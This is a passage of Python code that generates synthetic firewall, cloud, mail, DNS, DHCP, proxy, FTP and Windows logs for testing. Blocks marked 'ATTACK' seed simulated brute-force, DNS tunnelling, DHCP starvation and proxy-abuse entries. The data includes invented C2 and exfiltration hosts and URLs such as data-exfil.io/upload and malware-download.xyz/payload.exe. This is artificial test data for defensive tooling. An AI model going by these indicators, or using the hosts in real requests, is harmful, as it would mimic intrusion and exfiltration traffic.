        "Suspicious DNS Query",
        "SQL Injection Attempt",
        "Brute Force Attack",
        "Port Scan",
        "Malware Download",
    ]

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = random_timestamp(base_time).strftime("%Y/%m/%d %H:%M:%S")
        src_ip = random.choice(EXTERNAL_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        action = random.choice(["allow", "allow", "deny"])
        app = random.choice(["web-browsing", "ssl", "dns", "ssh", "mysql"])

        logs.append(
            f"{ts},TRAFFIC,end,{src_ip},{dst_ip},{random.randint(1024, 65535)},{random.choice([80, 443, 22, 3306])},{action},{app},any,any,{random.randint(100, 100000)},{random.randint(1, 1000)},0"
        )

    # ATTACK: Threat logs
    for _ in range(300):
        ts = random_timestamp(base_time).strftime("%Y/%m/%d %H:%M:%S")
        src_ip = random.choice(ATTACKER_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        threat = random.choice(threat_names)
        severity = random.choice(["critical", "high", "medium"])

        logs.append(
            f"{ts},THREAT,{threat},{src_ip},{dst_ip},{random.randint(1024, 65535)},{random.choice([80, 443, 22])},alert,{severity},any,any"
        )

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time).strftime("%Y/%m/%d %H:%M:%S")
        logs.append(f"{ts},SYSTEM,general,Configuration changed by admin,informational")

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:19])


def generate_fortigate_logs() -> List[str]:
    """Generate FortiGate firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        src_ip = random.choice(EXTERNAL_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        action = random.choice(["accept", "accept", "deny"])
        service = random.choice(["HTTP", "HTTPS", "SSH", "DNS", "MYSQL"])

        logs.append(
            f'date={ts.split()[0]} time={ts.split()[1]} devname="FGT60E" devid="FGT60E1234567890" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip={src_ip} dstip={dst_ip} srcport={random.randint(1024, 65535)} dstport={random.choice([80, 443, 22, 53, 3306])} action="{action}" service="{service}" sentbyte={random.randint(100, 100000)} rcvdbyte={random.randint(100, 100000)}'
        )

    # ATTACK: IPS events
    for attacker_ip in ATTACKER_IPS:
        for _ in range(20):
            ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
            attack = random.choice(
                ["SQL.Injection", "XSS.Attack", "Brute.Force", "Port.Scan"]
            )
            logs.append(
                f'date={ts.split()[0]} time={ts.split()[1]} devname="FGT60E" logid="0419016384" type="utm" subtype="ips" level="alert" srcip={attacker_ip} dstip=10.0.0.1 attack="{attack}" severity="high" action="dropped"'
            )

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        logs.append(
            f'date={ts.split()[0]} time={ts.split()[1]} devname="FGT60E" type="event" subtype="system" level="information" msg="Admin login successful"'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[5:24])


def generate_cisco_asa_logs() -> List[str]:
    """Generate Cisco ASA firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        src_ip = random.choice(EXTERNAL_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        action = random.choice(["Built", "Built", "Teardown", "Deny"])
        proto = random.choice(["TCP", "UDP"])

        if action == "Built":
            logs.append(
                f"{ts} %ASA-6-302013: {action} inbound {proto} connection {random.randint(100000, 999999)} for outside:{src_ip}/{random.randint(1024, 65535)} to inside:{dst_ip}/{random.choice([80, 443, 22])}"
            )
        elif action == "Teardown":
            logs.append(
                f"{ts} %ASA-6-302014: {action} {proto} connection {random.randint(100000, 999999)} for outside:{src_ip}/{random.randint(1024, 65535)} to inside:{dst_ip}/{random.choice([80, 443, 22])} duration 0:00:{random.randint(1, 59)} bytes {random.randint(100, 100000)}"
            )
        else:
            logs.append(
                f'{ts} %ASA-4-106023: {action} {proto} src outside:{src_ip}/{random.randint(1024, 65535)} dst inside:{dst_ip}/{random.choice([22, 23, 3389])} by access-group "outside_access_in"'
            )

    # ATTACK: Denied connections from attackers
    for attacker_ip in ATTACKER_IPS:
        for _ in range(40):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            port = random.choice([22, 23, 3389, 445, 1433])
            logs.append(
                f'{ts} %ASA-4-106023: Deny tcp src outside:{attacker_ip}/{random.randint(1024, 65535)} dst inside:10.0.0.1/{port} by access-group "outside_access_in"'
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} %ASA-6-305011: Built dynamic TCP translation from inside:10.0.0.{random.randint(1, 254)}/{random.randint(1024, 65535)} to outside:203.0.113.1/{random.randint(1024, 65535)}"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_checkpoint_logs() -> List[str]:
    """Generate Check Point firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%d%b%Y %H:%M:%S")
        src_ip = random.choice(EXTERNAL_IPS + ATTACKER_IPS[:3])
        dst_ip = random.choice(INTERNAL_IPS)
        action = (
            "accept" if src_ip not in ATTACKER_IPS or random.random() > 0.3 else "drop"
        )
        service = random.choice(["http", "https", "ssh", "dns", "mysql"])

        logs.append(
            f'{ts} fw1 product="VPN-1 & FireWall-1" src={src_ip} dst={dst_ip} proto=tcp service={service} s_port={random.randint(1024, 65535)} action="{action}" rule="Rule_{random.randint(1, 20)}"'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:17])


def generate_aws_vpc_flow_logs() -> List[str]:
    """Generate AWS VPC Flow Logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    account_id = "123456789012"
    eni_id = f"eni-{random.randint(10000000, 99999999):08x}"

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = int(random_timestamp(base_time).timestamp())
        src_ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        src_port = random.randint(1024, 65535)
        dst_port = random.choice([22, 80, 443, 3306, 5432])
        proto = random.choice([6, 17])  # TCP=6, UDP=17
        action = random.choice(["ACCEPT", "ACCEPT", "ACCEPT", "REJECT"])

        logs.append(
            f"2 {account_id} {eni_id} {src_ip} {dst_ip} {src_port} {dst_port} {proto} {random.randint(1, 100)} {random.randint(100, 100000)} {ts} {ts + random.randint(1, 60)} {action} OK"
        )

    # ATTACK: Rejected traffic from attackers
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = int(random_timestamp(base_time).timestamp())
            dst_port = random.choice([22, 3389, 445, 1433])
            logs.append(
                f"2 {account_id} {eni_id} {attacker_ip} 10.0.0.1 {random.randint(1024, 65535)} {dst_port} 6 1 40 {ts} {ts + 1} REJECT OK"
            )

    while len(logs) < LINES_PER_LOG:
        ts = int(random_timestamp(base_time).timestamp())
        logs.append(
            f"2 {account_id} {eni_id} 10.0.0.1 8.8.8.8 {random.randint(1024, 65535)} 53 17 1 60 {ts} {ts + 1} ACCEPT OK"
        )

    random.shuffle(logs)
    return logs


def generate_azure_nsg_logs() -> List[str]:
    """Generate Azure NSG Flow Logs (JSON format)"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = format_iso_timestamp(random_timestamp(base_time))
        src_ip = random.choice(EXTERNAL_IPS + ATTACKER_IPS[:2])
        dst_ip = random.choice(INTERNAL_IPS)
        action = "A" if src_ip not in ATTACKER_IPS else random.choice(["A", "D", "D"])
        direction = random.choice(["I", "O"])

        flow = f'{{"time":"{ts}","systemId":"xxxxxxxx","macAddress":"000D3A000001","category":"NetworkSecurityGroupFlowEvent","resourceId":"/SUBSCRIPTIONS/xxx/RESOURCEGROUPS/rg/PROVIDERS/MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/nsg","operationName":"NetworkSecurityGroupFlowEvents","properties":{{"Version":2,"flows":[{{"rule":"DefaultRule_AllowInternetOutBound","flows":[{{"mac":"000D3A000001","flowTuples":["{int(random_timestamp(base_time).timestamp())},{src_ip},{dst_ip},{random.randint(1024, 65535)},{random.choice([80, 443, 22])},T,{direction},{action},B"]}}]}}]}}}}'
        logs.append(flow)

    return logs


def generate_gcp_vpc_logs() -> List[str]:
    """Generate GCP VPC Firewall Logs (JSON format)"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = format_iso_timestamp(random_timestamp(base_time))
        src_ip = random.choice(EXTERNAL_IPS + ATTACKER_IPS[:2])
        dst_ip = random.choice(INTERNAL_IPS)
        action = (
            "ALLOWED"
            if src_ip not in ATTACKER_IPS
            else random.choice(["ALLOWED", "DENIED", "DENIED"])
        )

        log_entry = f'{{"insertId":"{uuid.uuid4()}","jsonPayload":{{"connection":{{"dest_ip":"{dst_ip}","dest_port":{random.choice([80, 443, 22])},"protocol":6,"src_ip":"{src_ip}","src_port":{random.randint(1024, 65535)}}},"disposition":"{action}","rule_details":{{"reference":"network:default/firewall:allow-http"}}}},"timestamp":"{ts}","severity":"INFO"}}'
        logs.append(log_entry)

    return logs


# ==================== MAIL LOGS ====================


def generate_postfix_logs() -> List[str]:
    """Generate Postfix mail logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    domains = ["example.com", "company.org", "mail.test.com"]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        queue_id = f"{random.randint(100000000, 999999999):X}"

        event = random.choice(
            [
                f"postfix/smtpd[{random.randint(1000, 9999)}]: connect from unknown[{random.choice(EXTERNAL_IPS)}]",
                f"postfix/smtpd[{random.randint(1000, 9999)}]: {queue_id}: client=unknown[{random.choice(EXTERNAL_IPS)}]",
                f"postfix/cleanup[{random.randint(1000, 9999)}]: {queue_id}: message-id=<{uuid.uuid4()}@{random.choice(domains)}>",
                f"postfix/qmgr[{random.randint(1000, 9999)}]: {queue_id}: from=<{random.choice(USERNAMES)}@{random.choice(domains)}>, size={random.randint(1000, 100000)}, nrcpt=1 (queue active)",
                f"postfix/smtp[{random.randint(1000, 9999)}]: {queue_id}: to=<{random.choice(USERNAMES)}@{random.choice(domains)}>, relay=mail.{random.choice(domains)}[{random.choice(EXTERNAL_IPS)}]:25, delay={random.uniform(0.1, 10):.1f}, status=sent",
                f"postfix/qmgr[{random.randint(1000, 9999)}]: {queue_id}: removed",
            ]
        )

        logs.append(f"{ts} {hostname} {event}")

    # ATTACK: Spam/relay attempts
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            logs.append(
                f"{ts} {hostname} postfix/smtpd[{random.randint(1000, 9999)}]: NOQUEUE: reject: RCPT from unknown[{attacker_ip}]: 554 5.7.1 <{random.choice(USERNAMES)}@spam.com>: Relay access denied"
            )

    # ATTACK: Auth failures
    for attacker_ip in ATTACKER_IPS[:5]:
        for _ in range(40):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            logs.append(
                f"{ts} {hostname} postfix/smtpd[{random.randint(1000, 9999)}]: warning: unknown[{attacker_ip}]: SASL LOGIN authentication failed: authentication failure"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {hostname} postfix/smtpd[{random.randint(1000, 9999)}]: disconnect from unknown[{random.choice(EXTERNAL_IPS)}] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_sendmail_logs() -> List[str]:
    """Generate Sendmail logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(LINES_PER_LOG):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        queue_id = "".join(
            random.choices(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=14
            )
        )

        event = random.choice(
            [
                f"sm-mta[{random.randint(1000, 9999)}]: {queue_id}: from=<{random.choice(USERNAMES)}@example.com>, size={random.randint(1000, 100000)}, class=0, nrcpts=1, msgid=<{uuid.uuid4()}@example.com>",
                f"sm-mta[{random.randint(1000, 9999)}]: {queue_id}: to=<{random.choice(USERNAMES)}@example.com>, ctladdr=<root@{hostname}>, delay=00:00:0{random.randint(1, 9)}, stat=Sent",
                f"sm-mta[{random.randint(1000, 9999)}]: {queue_id}: Milter: data, reject=550 5.7.1 Blocked by SpamAssassin",
            ]
        )

        logs.append(f"{ts} {hostname} {event}")

    return sorted(logs, key=lambda x: x[:15])


def generate_exim_logs() -> List[str]:
    """Generate Exim mail logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        msg_id = "".join(
            random.choices(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=16
            )
        )

        event = random.choice(
            [
                f"{msg_id} <= {random.choice(USERNAMES)}@example.com H=mail.example.com [{random.choice(EXTERNAL_IPS)}] P=esmtps S={random.randint(1000, 100000)}",
                f"{msg_id} => {random.choice(USERNAMES)}@example.com R=local_user T=local_delivery",
                f"{msg_id} Completed",
                f"SMTP connection from [{random.choice(EXTERNAL_IPS)}] (TCP/IP connection count = {random.randint(1, 10)})",
            ]
        )

        logs.append(f"{ts} {event}")

    return logs


def generate_dovecot_logs() -> List[str]:
    """Generate Dovecot IMAP/POP3 logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES)
        ip = random.choice(INTERNAL_IPS + EXTERNAL_IPS[:10])
        service = random.choice(["imap-login", "pop3-login", "imap", "pop3"])

        if "login" in service:
            logs.append(
                f"{ts} {hostname} dovecot: {service}: Login: user=<{user}>, method=PLAIN, rip={ip}, lip=10.0.0.1, mpid={random.randint(1000, 9999)}, secured, session=<{uuid.uuid4().hex[:16]}>"
            )
        else:
            logs.append(
                f"{ts} {hostname} dovecot: {service}({user}): Disconnected: Logged out in={random.randint(100, 10000)} out={random.randint(100, 10000)}"
            )

    # ATTACK: Brute force login attempts
    for attacker_ip in ATTACKER_IPS:
        attack_time = random_timestamp(base_time, 6)
        for i in range(80):
            ts = format_syslog_timestamp(attack_time + timedelta(seconds=i * 2))
            user = random.choice(ATTACKER_USERNAMES)
            logs.append(
                f"{ts} {hostname} dovecot: imap-login: Disconnected (auth failed, {random.randint(1, 3)} attempts in {random.randint(1, 5)} secs): user=<{user}>, method=PLAIN, rip={attacker_ip}, lip=10.0.0.1"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {hostname} dovecot: imap-login: Connection closed: read(size={random.randint(1, 1000)})=0 rip={random.choice(EXTERNAL_IPS)}, lip=10.0.0.1"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_exchange_logs() -> List[str]:
    """Generate Microsoft Exchange logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

        event_type = random.choice(["SEND", "RECEIVE", "DELIVER", "FAIL", "REDIRECT"])
        src_email = f"{random.choice(USERNAMES)}@company.com"
        dst_email = f"{random.choice(USERNAMES)}@{random.choice(['company.com', 'external.com'])}"
        msg_id = f"<{uuid.uuid4()}@company.com>"

        logs.append(
            f"{ts},{event_type},{random.choice(INTERNAL_IPS)},{src_email},{dst_email},{msg_id},{random.randint(1000, 100000)}"
        )

    return logs


# ==================== NETWORK LOGS ====================


def generate_dns_logs() -> List[str]:
    """Generate DNS server logs (BIND format)"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    domains = [
        "example.com",
        "google.com",
        "api.company.com",
        "cdn.cloudflare.com",
        "login.microsoft.com",
        "github.com",
        "aws.amazon.com",
        "internal.corp",
    ]
    malicious_domains = [
        "evil-c2.ru",
        "malware-download.xyz",
        "phishing-site.tk",
        "botnet-controller.cc",
        "data-exfil.io",
        "crypto-miner.net",
    ]
    record_types = ["A", "AAAA", "MX", "TXT", "CNAME", "NS", "PTR", "SOA"]

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        client_ip = random.choice(INTERNAL_IPS + EXTERNAL_IPS[:20])
        domain = random.choice(domains)
        record_type = random.choice(record_types)

        logs.append(
            f"{ts} {hostname} named[{random.randint(1000, 9999)}]: client @0x{random.randint(0x1000, 0xFFFF):x} {client_ip}#{random.randint(1024, 65535)} ({domain}): query: {domain} IN {record_type} + ({random.choice(INTERNAL_IPS)})"
        )

    # ATTACK: DNS tunneling / C2 communication
    for attacker_ip in ATTACKER_IPS[:5]:
        for _ in range(50):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            encoded_data = hashlib.md5(str(random.random()).encode()).hexdigest()[:32]
            malicious = random.choice(malicious_domains)
            logs.append(
                f"{ts} {hostname} named[{random.randint(1000, 9999)}]: client @0x{random.randint(0x1000, 0xFFFF):x} {attacker_ip}#{random.randint(1024, 65535)} ({encoded_data}.{malicious}): query: {encoded_data}.{malicious} IN TXT + ({random.choice(INTERNAL_IPS)})"
            )

    # ATTACK: DNS amplification (many ANY queries)
    for _ in range(100):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        spoofed_ip = random.choice(ATTACKER_IPS)
        logs.append(
            f"{ts} {hostname} named[{random.randint(1000, 9999)}]: client @0x{random.randint(0x1000, 0xFFFF):x} {spoofed_ip}#{random.randint(1024, 65535)} (example.com): query: example.com IN ANY + ({random.choice(INTERNAL_IPS)})"
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {hostname} named[{random.randint(1000, 9999)}]: zone example.com/IN: loaded serial {random.randint(2024010100, 2024123199)}"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_dhcp_logs() -> List[str]:
    """Generate DHCP server logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    mac_prefixes = ["00:1A:2B", "08:00:27", "52:54:00", "00:0C:29", "00:50:56"]

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        mac = f"{random.choice(mac_prefixes)}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
        assigned_ip = f"10.0.{random.randint(1, 10)}.{random.randint(1, 254)}"
        lease_time = random.choice([3600, 7200, 14400, 86400])

        event = random.choice(
            [
                f"DHCPDISCOVER from {mac} via eth0",
                f"DHCPOFFER on {assigned_ip} to {mac} via eth0",
                f"DHCPREQUEST for {assigned_ip} from {mac} via eth0",
                f"DHCPACK on {assigned_ip} to {mac} via eth0",
                f"DHCPRELEASE of {assigned_ip} from {mac} via eth0",
            ]
        )

        logs.append(f"{ts} {hostname} dhcpd[{random.randint(1000, 9999)}]: {event}")

    # ATTACK: DHCP starvation (many DISCOVER from spoofed MACs)
    attack_time = random_timestamp(base_time, 4)
    for i in range(200):
        ts = format_syslog_timestamp(attack_time + timedelta(seconds=i * 0.5))
        fake_mac = (
            f"DE:AD:BE:EF:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
        )
        logs.append(
            f"{ts} {hostname} dhcpd[{random.randint(1000, 9999)}]: DHCPDISCOVER from {fake_mac} via eth0: network 10.0.0.0/8: no free leases"
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {hostname} dhcpd[{random.randint(1000, 9999)}]: Wrote {random.randint(10, 500)} leases to leases file."
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_proxy_logs() -> List[str]:
    """Generate Squid proxy logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    result_codes = [
        "TCP_HIT/200",
        "TCP_MISS/200",
        "TCP_DENIED/403",
        "TCP_MISS/304",
        "TCP_MISS/404",
        "TCP_MISS/500",
    ]
    methods = ["GET", "POST", "CONNECT", "HEAD"]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = int(random_timestamp(base_time).timestamp())
        duration = random.randint(1, 5000)
        client_ip = random.choice(INTERNAL_IPS)
        result = random.choice(result_codes)
        size = random.randint(100, 500000)
        method = random.choice(methods)
        url = f"http{'s' if random.random() > 0.5 else ''}://{random.choice(['google.com', 'github.com', 'api.company.com', 'cdn.example.com'])}{random.choice(URLS)}"

        logs.append(
            f"{ts}.{random.randint(100, 999)} {duration:>6} {client_ip} {result} {size:>8} {method} {url} - HIER_DIRECT/{random.choice(EXTERNAL_IPS)} text/html"
        )

    # ATTACK: Access to malicious/blocked sites
    for attacker_ip in ATTACKER_IPS[:3]:
        for _ in range(50):
            ts = int(random_timestamp(base_time).timestamp())
            malicious_url = random.choice(
                [
                    "http://malware-download.xyz/payload.exe",
                    "https://phishing-site.tk/login.php",
                    "http://crypto-miner.net/miner.js",
                    "https://data-exfil.io/upload",
                ]
            )
            logs.append(
                f"{ts}.{random.randint(100, 999)} {random.randint(1, 100):>6} {attacker_ip} TCP_DENIED/403 {random.randint(500, 2000):>8} GET {malicious_url} - HIER_NONE/- text/html"
            )

    # ATTACK: Proxy abuse (CONNECT to suspicious ports)
    for _ in range(100):
        ts = int(random_timestamp(base_time).timestamp())
        client_ip = random.choice(ATTACKER_IPS[:3] + INTERNAL_IPS[:3])
        suspicious_port = random.choice([1080, 8080, 3128, 4444, 5555, 6666, 31337])
        logs.append(
            f"{ts}.{random.randint(100, 999)} {random.randint(1, 5000):>6} {client_ip} TCP_DENIED/403 {random.randint(100, 500):>8} CONNECT {random.choice(EXTERNAL_IPS)}:{suspicious_port} - HIER_NONE/- -"
        )

    while len(logs) < LINES_PER_LOG:
        ts = int(random_timestamp(base_time).timestamp())
        logs.append(
            f"{ts}.{random.randint(100, 999)} {random.randint(1, 100):>6} 127.0.0.1 TCP_HIT/200 {random.randint(100, 1000):>8} GET http://localhost/health - HIER_NONE/- text/plain"
        )

    random.shuffle(logs)
    return logs


# ==================== ADDITIONAL FTP LOGS ====================


def generate_proftpd_logs() -> List[str]:
    """Generate ProFTPD logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES[:10])
        ip = random.choice(INTERNAL_IPS + EXTERNAL_IPS[:10])

        event = random.choice(
            [
                f"proftpd[{random.randint(1000, 9999)}] {hostname} ({ip}[{ip}]): USER {user}: Login successful",
                f"proftpd[{random.randint(1000, 9999)}] {hostname} ({ip}[{ip}]): FTP session opened.",
                f"proftpd[{random.randint(1000, 9999)}] {hostname} ({ip}[{ip}]): FTP session closed.",
                f"proftpd[{random.randint(1000, 9999)}] {hostname} ({ip}[{ip}]): STOR /home/{user}/{random.choice(['file.txt', 'data.csv', 'backup.tar.gz'])} - {random.randint(1000, 10000000)} bytes",
                f"proftpd[{random.randint(1000, 9999)}] {hostname} ({ip}[{ip}]): RETR /home/{user}/{random.choice(['report.pdf', 'export.zip'])} - {random.randint(1000, 50000000)} bytes",
            ]
        )

        logs.append(f"{ts} {event}")

    # ATTACK: Brute force login attempts
    for attacker_ip in ATTACKER_IPS:
        attack_time = random_timestamp(base_time, 6)
        for i in range(80):
            ts = format_syslog_timestamp(attack_time + timedelta(seconds=i * 2))
            user = random.choice(ATTACKER_USERNAMES)
            logs.append(
                f"{ts} proftpd[{random.randint(1000, 9999)}] {hostname} ({attacker_ip}[{attacker_ip}]): USER {user}: no such user found from {attacker_ip} [{attacker_ip}] to {random.choice(INTERNAL_IPS)}:21"
            )
            logs.append(
                f"{ts} proftpd[{random.randint(1000, 9999)}] {hostname} ({attacker_ip}[{attacker_ip}]): USER {user} (Login failed): Incorrect password"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} proftpd[{random.randint(1000, 9999)}] {hostname}: ProFTPD 1.3.7 (stable) standalone mode STARTUP"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


# ==================== WINDOWS LOGS ====================


def generate_windows_security_logs() -> List[str]:
    """Generate Windows Security Event logs (CSV format)"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    # Event IDs: 4624=successful login, 4625=failed login, 4634=logoff, 4648=explicit credentials, 4672=special privileges
    logon_types = {
        2: "Interactive",
        3: "Network",
        4: "Batch",
        5: "Service",
        7: "Unlock",
        10: "RemoteInteractive",
    }

    # Header
    logs.append(
        "TimeCreated,EventID,LevelDisplayName,LogName,MachineName,Message,AccountName,LogonType,IpAddress,WorkstationName,Status"
    )

    for _ in range(int(LINES_PER_LOG * 0.5)):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        event_id = random.choice([4624, 4624, 4624, 4634, 4672])
        user = random.choice(USERNAMES)
        machine = random.choice(HOSTNAMES).upper()
        logon_type = random.choice(list(logon_types.keys()))
        ip = random.choice(INTERNAL_IPS + ["-"])

        if event_id == 4624:
            msg = f"An account was successfully logged on. Subject: {user} Logon Type: {logon_type}"
        elif event_id == 4634:
            msg = f"An account was logged off. Subject: {user}"
        else:
            msg = f"Special privileges assigned to new logon. Subject: {user}"

        logs.append(
            f"{ts},{event_id},Information,Security,{machine},{msg},{user},{logon_type},{ip},{machine},0x0"
        )

    # ATTACK: Failed login attempts (Event ID 4625)
    for attacker_ip in ATTACKER_IPS:
        attack_time = random_timestamp(base_time, 8)
        for i in range(100):
            ts = (attack_time + timedelta(seconds=i * 3)).strftime("%Y-%m-%d %H:%M:%S")
            user = random.choice(["Administrator", "admin", "root", "sa", "guest"])
            machine = random.choice(HOSTNAMES).upper()
            status = random.choice(
                ["0xC000006D", "0xC000006A", "0xC0000064"]
            )  # Various failure codes
            msg = f"An account failed to log on. Subject: {user} Failure Reason: Unknown user name or bad password"

            logs.append(
                f"{ts},4625,Warning,Security,{machine},{msg},{user},3,{attacker_ip},{machine},{status}"
            )

    # ATTACK: Privilege escalation (4672 followed by suspicious activity)
    for _ in range(50):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        user = random.choice(["NT AUTHORITY\\SYSTEM", "BUILTIN\\Administrators"])
        machine = random.choice(HOSTNAMES).upper()
        msg = f"Special privileges assigned to new logon. Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege"
        logs.append(
            f"{ts},4672,Information,Security,{machine},{msg},{user},0,-,{machine},0x0"
        )

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        machine = random.choice(HOSTNAMES).upper()
        logs.append(
            f"{ts},4624,Information,Security,{machine},An account was successfully logged on.,SYSTEM,5,-,{machine},0x0"
        )

    return logs


def generate_windows_system_logs() -> List[str]:
    """Generate Windows System Event logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    # Header
    logs.append(
        "TimeCreated,EventID,LevelDisplayName,LogName,MachineName,ProviderName,Message"
    )

    providers = [
        "Microsoft-Windows-Kernel-General",
        "Service Control Manager",
        "Microsoft-Windows-Power-Troubleshooter",
        "Microsoft-Windows-WindowsUpdateClient",
        "Microsoft-Windows-DNS-Client",
    ]

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        machine = random.choice(HOSTNAMES).upper()
        provider = random.choice(providers)

        if provider == "Service Control Manager":
            event_id = random.choice([7036, 7040, 7045])
            level = random.choice(["Information", "Information", "Warning"])
            service = random.choice(
                [
                    "Windows Update",
                    "BITS",
                    "WinRM",
                    "Remote Desktop Services",
                    "SQL Server",
                ]
            )
            msg = random.choice(
                [
                    f"The {service} service entered the running state.",
                    f"The {service} service entered the stopped state.",
                    f"A service was installed: {service}",
                ]
            )
        elif provider == "Microsoft-Windows-Kernel-General":
            event_id = random.choice([12, 13, 1])
            level = "Information"
            msg = random.choice(
                [
                    "The operating system started at system time",
                    "The operating system is shutting down at system time",
                    "The system time has changed",
                ]
            )
        else:
            event_id = random.randint(1, 1000)
            level = random.choice(["Information", "Warning", "Error"])
            msg = f"Generic system event from {provider}"

        logs.append(f"{ts},{event_id},{level},System,{machine},{provider},{msg}")

    return logs


def generate_windows_application_logs() -> List[str]:
    """Generate Windows Application Event logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    # Header
    logs.append(
        "TimeCreated,EventID,LevelDisplayName,LogName,MachineName,ProviderName,Message"
    )

    providers = [
        "Application Error",
        "Windows Error Reporting",
        "MSSQLSERVER",
        "IIS-W3SVC",
        ".NET Runtime",
        "Application Hang",
        "VSS",
    ]

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        machine = random.choice(HOSTNAMES).upper()
        provider = random.choice(providers)
        level = random.choice(["Information", "Information", "Warning", "Error"])
